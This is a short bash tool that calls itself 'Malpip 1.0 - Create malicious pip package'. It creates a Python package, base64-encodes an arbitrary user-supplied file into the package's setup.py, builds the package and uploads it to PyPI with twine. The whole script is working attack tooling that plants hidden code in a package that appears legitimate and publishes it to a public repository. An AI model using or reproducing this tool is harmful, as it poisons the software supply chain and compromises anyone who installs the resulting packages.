#!/bin/bash

# Functions

install() {
  if [[ $EUID -eq 0 ]];then
    apt-get update
    #apt-get upgrade -y
    apt-get install -y python3 pip
    pip install --upgrade pip
    pip install twine
    echo -e "[+] Done."
  else
    echo -e "Please run as root."
  fi
}

create() {
  PROJ_NAME=$1
  FILE=$2
  if [[ ! -d $PROJ_NAME ]];then
    mkdir -p $PROJ_NAME/src/examples
    touch $PROJ_NAME/src/examples/__init__.py $PROJ_NAME/src/examples/options.py
    cp setup_template.py $PROJ_NAME/setup.py
    sed -i "s/PACKAGE_NAME/$PROJ_NAME/" $PROJ_NAME/setup.py
    inject $PROJ_NAME $FILE
    cd $PROJ_NAME
    python3 setup.py sdist --formats=gztar
    twine upload dist/* --verbose
    echo -e "\n[+] Done"
  else
    echo -e "Directory already exists."
    exit 1
  fi
}

inject(){
  PROJ_NAME=$1
  FILE=$2
  sed -i "s/CODE_REPLACE/$(cat $FILE | base64)/" $PROJ_NAME/setup.py
}

usage(){
  echo -e "  Malpip 1.0 - Create malicious pip package"
  echo -e "  Andres J. Moreno - thegoodhackertv@gmail.com"
  echo -e "  @thegoodhackertv\n\n"
  echo -e "Usage: $0 OPTION [PROJECT_NAME] [FILE]\n"
  echo -e "Options:"
  echo -e "  install\tUpdate packages and install dependencies"
  echo -e "  create\tCreate package structure and inject code from FILE"
  echo -e "  usage\t\tDisplay this usage message\n"
  echo -e "Examples:"
  echo -e "  $0 create valid-project-name command.txt\n"
}

# Main

if [[ $# -eq 0 || $# -gt 3 ]];then
  usage
  exit 1
fi



case $1 in
  "install")
  if [[ $# -eq 1 ]];then
    install
  else
    usage
    exit 1
  fi
  ;;
  "create")
  if [[ $# -eq 3 ]];then
    create $2 $3
  else
    usage
    exit 1
  fi
  ;;
  *)
  usage
  ;;
esac
